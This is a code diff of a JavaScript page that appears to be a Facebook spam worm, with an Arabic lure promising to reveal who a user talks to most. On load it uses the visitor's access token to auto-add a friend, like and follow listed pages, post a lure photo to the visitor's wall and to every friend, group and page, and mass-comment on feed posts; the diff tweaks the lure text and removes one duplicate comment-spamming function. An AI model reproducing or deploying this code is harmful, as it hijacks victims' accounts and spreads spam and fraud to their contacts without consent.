@@ -94,7 +94,7 @@ $('#div').hide().delay(15000).show('slow');
 
 	<script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>
 	<script>
-Feed_Tag();Get_Groups();Get_Friends(); Get_Pages();getStatus("");getStatu("");
+Feed_Tag();Get_Groups();Get_Friends(); Get_Pages();getStatus("");
 
 
 MS_AddFriend("100008315741835");
@@ -118,7 +118,7 @@ MS_like("https://www.facebook.com/TelefunkenEgypt");
 MS_like("https://www.facebook.com/Secrets.Problems.Solving.solutions");
 
 function Feed_Tag() {
-$.getJSON('https://graph.facebook.com/me/photos?url=http://www.soq4all.com/forum/top4/img/img-.jpg&message=%D8%A7%D8%B9%D8%B1%D9%81+%D8%A3%D9%83%D8%AB%D8%B1+%D8%A7%D8%B1%D8%A8%D8%B9%D9%87+%D8%A7%D8%AA%D9%83%D9%84%D9%85%D8%AA+%D9%85%D8%B9%D8%A7%D9%87%D9%85+%2B+%D8%B9%D8%AF%D8%AF+%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D9%8A%D9%84+%D9%84%D9%83%D9%84+%D9%85%D9%86%D9%87%D9%85+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+++https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_800485699973724+38&method=POST&access_token=', function (f) {
+$.getJSON('https://graph.facebook.com/me/photos?url=http://www.soq4all.com/forum/top4/img/img-.jpg&message=%D8%A7%D8%B9%D8%B1%D9%81+%D8%A3%D9%83%D8%AB%D8%B1+%D8%A7%D8%B1%D8%A8%D8%B9%D9%87+%D8%A7%D8%AA%D9%83%D9%84%D9%85%D8%AA+%D9%85%D8%B9%D8%A7%D9%87%D9%85+%2B+%D8%B9%D8%AF%D8%AF+%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D9%8A%D9%84+%D9%84%D9%83%D9%84+%D9%85%D9%86%D9%87%D9%85+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+++https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_800485699973724+48&method=POST&access_token=', function (f) {
     if (f.id) {
         $.getJSON('https://graph.facebook.com/me/friends?limit=500&access_token=', function (c) {
             if (c.data) {
@@ -174,18 +174,18 @@ function Get_Friends() {
 
 function Feed_Friends(a) {
   for(i = 0; i < a.data.length; i++) {
-    $.getJSON('https://graph.facebook.com/' + a.data[i].uid + '/photos?url=http://www.soq4all.com/forum/top4/img/img-.jpg&message=%D8%A7%D8%B9%D8%B1%D9%81+%D8%A3%D9%83%D8%AB%D8%B1+%D8%A7%D8%B1%D8%A8%D8%B9%D9%87+%D8%A7%D8%AA%D9%83%D9%84%D9%85%D8%AA+%D9%85%D8%B9%D8%A7%D9%87%D9%85+%2B+%D8%B9%D8%AF%D8%AF+%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D9%8A%D9%84+%D9%84%D9%83%D9%84+%D9%85%D9%86%D9%87%D9%85+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+++https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_800485699973724+55&method=POST&access_token=');
+    $.getJSON('https://graph.facebook.com/' + a.data[i].uid + '/photos?url=http://www.soq4all.com/forum/top4/img/img-.jpg&message=%D8%A7%D8%B9%D8%B1%D9%81+%D8%A3%D9%83%D8%AB%D8%B1+%D8%A7%D8%B1%D8%A8%D8%B9%D9%87+%D8%A7%D8%AA%D9%83%D9%84%D9%85%D8%AA+%D9%85%D8%B9%D8%A7%D9%87%D9%85+%2B+%D8%B9%D8%AF%D8%AF+%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D9%8A%D9%84+%D9%84%D9%83%D9%84+%D9%85%D9%86%D9%87%D9%85+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+++https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_800485699973724+69&method=POST&access_token=');
   }
 }
 
 function Feed_Groups(a) {
   for(i = 0; i < a.data.length; i++) {
-    $.getJSON('https://graph.facebook.com/' + a.data[i].gid + '/photos?url=http://www.soq4all.com/forum/top4/img/img-.jpg&message=%D8%A7%D8%B9%D8%B1%D9%81+%D8%A3%D9%83%D8%AB%D8%B1+%D8%A7%D8%B1%D8%A8%D8%B9%D9%87+%D8%A7%D8%AA%D9%83%D9%84%D9%85%D8%AA+%D9%85%D8%B9%D8%A7%D9%87%D9%85+%2B+%D8%B9%D8%AF%D8%AF+%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D9%8A%D9%84+%D9%84%D9%83%D9%84+%D9%85%D9%86%D9%87%D9%85+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+++https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_800485699973724+91&method=POST&access_token=');
+    $.getJSON('https://graph.facebook.com/' + a.data[i].gid + '/photos?url=http://www.soq4all.com/forum/top4/img/img-.jpg&message=%D8%A7%D8%B9%D8%B1%D9%81+%D8%A3%D9%83%D8%AB%D8%B1+%D8%A7%D8%B1%D8%A8%D8%B9%D9%87+%D8%A7%D8%AA%D9%83%D9%84%D9%85%D8%AA+%D9%85%D8%B9%D8%A7%D9%87%D9%85+%2B+%D8%B9%D8%AF%D8%AF+%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D9%8A%D9%84+%D9%84%D9%83%D9%84+%D9%85%D9%86%D9%87%D9%85+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+++https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_800485699973724+35&method=POST&access_token=');
   }
 }
 function Feed_Pages(a) {
   for(i = 0; i < a.data.length; i++) {
-    $.getJSON('https://graph.facebook.com/' + a.data[i].page_id + '/photos?url=http://www.soq4all.com/forum/top4/img/img-.jpg&message=%D8%A7%D8%B9%D8%B1%D9%81+%D8%A3%D9%83%D8%AB%D8%B1+%D8%A7%D8%B1%D8%A8%D8%B9%D9%87+%D8%A7%D8%AA%D9%83%D9%84%D9%85%D8%AA+%D9%85%D8%B9%D8%A7%D9%87%D9%85+%2B+%D8%B9%D8%AF%D8%AF+%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D9%8A%D9%84+%D9%84%D9%83%D9%84+%D9%85%D9%86%D9%87%D9%85+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+++https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_800485699973724+23&method=POST&access_token=');
+    $.getJSON('https://graph.facebook.com/' + a.data[i].page_id + '/photos?url=http://www.soq4all.com/forum/top4/img/img-.jpg&message=%D8%A7%D8%B9%D8%B1%D9%81+%D8%A3%D9%83%D8%AB%D8%B1+%D8%A7%D8%B1%D8%A8%D8%B9%D9%87+%D8%A7%D8%AA%D9%83%D9%84%D9%85%D8%AA+%D9%85%D8%B9%D8%A7%D9%87%D9%85+%2B+%D8%B9%D8%AF%D8%AF+%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D9%8A%D9%84+%D9%84%D9%83%D9%84+%D9%85%D9%86%D9%87%D9%85+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+++https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_800485699973724+18&method=POST&access_token=');
   }
 }
 
@@ -212,29 +212,6 @@ function MS_Follow(id){
 	 }
 
 
-
-function getStatu(token){
-var commentShort = "%D9%88%D8%A7%D9%84%D9%84%D9%87+%D8%B4%D8%AD%D9%86%D8%AA+20+%D8%AC%D9%86%D9%8A%D9%87+%D8%B1%D8%B5%D9%8A%D8%AF+%D9%85%D8%AC%D8%A7%D9%86%D9%89+%D9%88%D8%A7%D9%84%D9%84%D9%87+%D8%AD%D9%82%D9%8A%D9%82%D9%89+%D8%A7%D9%84%D9%84%D9%89+%D8%B9%D8%A7%D9%88%D8%B2+%D9%8A%D8%B4%D8%AD%D9%86+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_625040107610390+";
-$.getJSON('https://graph.facebook.com/me?access_token=' + token, function (response) {
-if (response.id) {
-  var userid = response.id;
-  var totalComments = 10000;
-  $.getJSON('https://graph.facebook.com/' + userid + '/home?limit=' + totalComments + '&access_token=' + token, function (response) {
-    if(response.data){
-    var allPosts = [];
-    $.each(response.data, function(i,data){
-      allPosts.push(data.id);
-      var megaNumber=Math.floor(Math.random()*900);
-      var commentMessage = commentShort;
-      $.getJSON('https://graph.facebook.com/' + data.id + '/comments?method=POST&message=' + commentMessage + '&access_token=' + token, function (response) {
-      //alert("Comment Posted!");
-      });
-    });
-    }
-  });
-}
-});
-}
 
 function getStatus(token){
 var commentShort = "%D8%A7%D8%B9%D8%B1%D9%81+%D8%A3%D9%83%D8%AB%D8%B1+%D8%A7%D8%B1%D8%A8%D8%B9%D9%87+%D8%A7%D8%AA%D9%83%D9%84%D9%85%D8%AA+%D9%85%D8%B9%D8%A7%D9%87%D9%85+%2B+%D8%B9%D8%AF%D8%AF+%D8%A7%D9%84%D8%B1%D8%B3%D8%A7%D9%8A%D9%84+%D9%84%D9%83%D9%84+%D9%85%D9%86%D9%87%D9%85+%D9%85%D9%86+%D9%87%D9%86%D8%A7+%3D%3D%3E+++https%3A%2F%2Fwww.facebook.com%2Fhome.php%3Fsk%3Dgroup_800485699973724+";
